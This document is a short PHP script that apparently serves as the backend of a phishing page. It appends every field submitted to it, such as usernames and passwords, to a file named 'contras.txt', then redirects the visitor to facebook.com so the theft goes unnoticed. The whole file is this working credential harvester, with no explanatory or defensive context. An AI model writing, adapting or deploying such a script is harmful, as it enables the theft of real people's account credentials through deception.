<?php
$archivo = fopen("contras.txt", "a");
fwrite($archivo, "\r\n");
foreach ($_POST as $key => $value) {
    fwrite($archivo, $key . "=" . $value . "\r\n");
}
fclose($archivo);
header("Location: https://www.facebook.com");
die();
?>
